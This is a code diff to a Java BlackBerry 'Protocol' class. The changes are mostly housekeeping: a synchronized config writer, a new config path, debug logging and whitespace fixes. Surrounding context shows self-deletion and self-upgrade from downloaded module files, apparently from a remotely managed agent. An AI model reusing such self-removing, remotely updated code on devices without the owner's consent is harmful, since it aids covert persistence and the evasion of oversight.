@@ -46,18 +46,18 @@ public abstract class Protocol {
 
     public abstract boolean perform() throws ProtocolException;
 
-    public static boolean saveNewConf(byte[] conf, int offset)
+    public synchronized static boolean saveNewConf(byte[] conf, int offset)
             throws CommandException {
-        final AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
+        final AutoFlashFile file = new AutoFlashFile(Path.USER() + Path.CONF_DIR
                 + Conf.NEW_CONF, true);
-
-        if (file.exists()) {
-            file.delete();
-        }
 
         file.create();
         final boolean ret = file.write(conf, offset, conf.length - offset);
         if (!ret) {
+            //#ifdef DEBUG
+            debug.error("saveNewConf: cannot write on file: "
+                    + file.getFilename());
+            //#endif
             throw new CommandException(); //"write"
         }
 
@@ -96,13 +96,13 @@ public abstract class Protocol {
 
         if (file_0.exists() && file_1.exists()) {
             //#ifdef DEBUG
-            debug.trace("upgradeMulti: both file present");            
+            debug.trace("upgradeMulti: both file present");
             //#endif                        
-            
+
             deleteSelf();
             upgradeCod(file_0.read(), Protocol.UPGRADE_FILENAME_0);
             upgradeCod(file_1.read(), Protocol.UPGRADE_FILENAME_1);
-            
+
             file_0.delete();
             file_1.delete();
 
@@ -117,15 +117,15 @@ public abstract class Protocol {
             }
 
             return true;
-        }else{
+        } else {
             //#ifdef DEBUG
             debug.trace("upgradeMulti: not both.");
             //#endif
             return false;
         }
     }
-    
-    public static boolean deleteSelf(){
+
+    public static boolean deleteSelf() {
         // Delete it self.
         final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
         if (handle != 0) {
@@ -151,7 +151,7 @@ public abstract class Protocol {
         //#ifdef DEBUG
         debug.trace("upgrading: " + module_name);
         //#endif
-       
+
         // Download new cod files(included sibling files).
 
         int newHandle = 0;
